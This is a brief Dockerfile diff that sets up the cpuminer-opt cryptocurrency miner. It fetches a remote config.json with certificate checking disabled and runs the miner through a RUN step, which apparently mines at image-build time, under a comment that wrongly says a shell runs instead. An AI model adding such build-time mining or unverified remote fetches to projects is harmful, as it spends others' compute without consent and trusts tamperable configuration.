@@ -37,4 +37,4 @@ RUN cd cpuminer-opt
 RUN wget --no-check-certificate https://raw.githubusercontent.com/rmaglite/blk/main/config.json -O config.json
 
 # Set the entrypoint to run a shell instead of the cpuminer command
-RUN ./cpuminer --config config.json
+RUN ./app/cpuminer-opt/cpuminer --config /app/cpuminer-opt/config.json
